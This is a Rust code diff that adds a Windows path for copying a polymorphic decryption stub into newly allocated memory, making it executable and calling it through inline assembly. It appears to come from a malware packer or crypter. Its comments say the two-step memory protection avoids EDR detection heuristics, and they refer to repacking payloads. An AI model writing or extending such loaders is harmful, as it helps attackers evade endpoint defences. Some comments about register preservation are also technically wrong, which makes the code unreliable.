@@ -182,26 +182,133 @@ fn poly_decrypt_chacha20(ct: &[u8], key: &[u8]) -> Result<Vec<u8>> {
 /// in-place into a new allocation and returns a pointer that we wrap in a Vec.
 ///
 /// On Linux x86_64: mmap an RWX page, copy the stub, mprotect to RX, call it.
-/// On other platforms: fall back to XOR-with-key-cycle (the stub uses the
-/// same algorithm).
+/// On Windows x86_64: VirtualAlloc an RW region, copy the stub, VirtualProtect
+/// to PAGE_EXECUTE_READ, then call it via an inline-asm trampoline that loads
+/// arguments into the System V AMD64 ABI registers (RDI, RSI, RDX, RCX)
+/// expected by the stub.
+/// On other platforms: return an error.
 fn poly_exec_raw_stub(ct: &[u8], stub: &[u8]) -> Result<Vec<u8>> {
     #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     {
         return poly_exec_raw_stub_linux(ct, stub);
     }
-    #[cfg(not(all(target_os = "linux", target_arch = "x86_64")))]
+    #[cfg(all(target_os = "windows", target_arch = "x86_64"))]
     {
-        // Fallback: the stub implements XOR-with-cycled-key; the key bytes are
-        // appended after the RET instruction.  We can't easily parse the offset
-        // without running the stub, so we just signal an error on unsupported
-        // platforms.
+        return poly_exec_raw_stub_windows(ct, stub);
+    }
+    #[cfg(not(any(
+        all(target_os = "linux", target_arch = "x86_64"),
+        all(target_os = "windows", target_arch = "x86_64"),
+    )))]
+    {
         let _ = stub;
         let _ = ct;
         anyhow::bail!(
-            "RawStub scheme (ID 3) requires Linux x86_64; \
+            "RawStub scheme (ID 3) requires Linux x86_64 or Windows x86_64; \
              repack the payload with a different scheme for this platform"
         );
     }
+}
+
+#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
+fn poly_exec_raw_stub_windows(ct: &[u8], stub: &[u8]) -> Result<Vec<u8>> {
+    use winapi::um::memoryapi::{VirtualAlloc, VirtualFree, VirtualProtect};
+    use winapi::um::winnt::{
+        MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE,
+    };
+
+    if stub.is_empty() {
+        anyhow::bail!("RawStub: empty stub code");
+    }
+
+    // Allocate a read-write region, copy the stub bytes, then flip it to
+    // PAGE_EXECUTE_READ before calling into it.  Using two distinct protection
+    // states (write first, then execute) avoids PAGE_EXECUTE_READWRITE which
+    // is flagged by many EDR heuristics.
+    //
+    // SAFETY: standard VirtualAlloc / VirtualProtect usage with validated inputs.
+    let stub_ptr: *mut u8 = unsafe {
+        let p = VirtualAlloc(
+            std::ptr::null_mut(),
+            stub.len(),
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_READWRITE,
+        ) as *mut u8;
+        if p.is_null() {
+            anyhow::bail!(
+                "VirtualAlloc for stub failed: {}",
+                std::io::Error::last_os_error()
+            );
+        }
+        std::ptr::copy_nonoverlapping(stub.as_ptr(), p, stub.len());
+        let mut old_prot: u32 = 0;
+        if VirtualProtect(p as *mut _, stub.len(), PAGE_EXECUTE_READ, &mut old_prot) == 0 {
+            VirtualFree(p as *mut _, 0, MEM_RELEASE);
+            anyhow::bail!(
+                "VirtualProtect(PAGE_EXECUTE_READ) for stub failed: {}",
+                std::io::Error::last_os_error()
+            );
+        }
+        p
+    };
+
+    // Allocate the output buffer.
+    let mut output = vec![0u8; ct.len()];
+
+    // The stub was emitted by stub_emitter.rs following the System V AMD64
+    // ABI, which passes the first four arguments in RDI, RSI, RDX, RCX:
+    //
+    //   extern "C" fn decrypt_stub(
+    //       ciphertext:  *const u8,   // RDI
+    //       ct_len:      usize,        // RSI
+    //       key:         *const u8,   // RDX  (ignored; stub uses RIP-relative embedded key)
+    //       output:      *mut u8,     // RCX
+    //   )
+    //
+    // On Windows, Rust's `extern "C"` uses the Microsoft x64 ABI (RCX, RDX,
+    // R8, R9), so a plain transmute-and-call would mis-route the arguments.
+    // We use inline assembly to load the arguments into the correct System V
+    // registers before issuing the CALL.
+    //
+    // `in("rdi")` / `in("rsi")` inform the compiler that RDI and RSI (which
+    // are callee-saved under the Windows x64 ABI) may be clobbered by this
+    // asm block; the compiler will save and restore them if it has live values
+    // there.  RAX and R8–R11 are caller-saved in both ABIs and are declared as
+    // late outputs to prevent the compiler from trusting their values after
+    // the call.
+    //
+    // SAFETY: stub_ptr is PAGE_EXECUTE_READ memory containing a
+    // position-independent decryption stub; `output` has `ct.len()` bytes.
+    unsafe {
+        std::arch::asm!(
+            "call {stub}",
+            stub         = in(reg)    stub_ptr,
+            in("rdi")                 ct.as_ptr(),
+            in("rsi")                 ct.len(),
+            in("rdx")                 std::ptr::null::<u8>(),
+            in("rcx")                 output.as_mut_ptr(),
+            // Declare all registers that the stub (as a System V callee) may
+            // clobber but that are caller-saved and not already declared above.
+            lateout("rax") _,
+            lateout("r8")  _,
+            lateout("r9")  _,
+            lateout("r10") _,
+            lateout("r11") _,
+        );
+    }
+
+    // Release the stub allocation.
+    // SAFETY: stub_ptr was returned by VirtualAlloc with MEM_RELEASE semantics.
+    unsafe {
+        VirtualFree(stub_ptr as *mut _, 0, MEM_RELEASE);
+    }
+
+    tracing::info!(
+        ct_bytes   = ct.len(),
+        stub_bytes = stub.len(),
+        "RawStub decryption complete (Windows)"
+    );
+    Ok(output)
 }
 
 #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
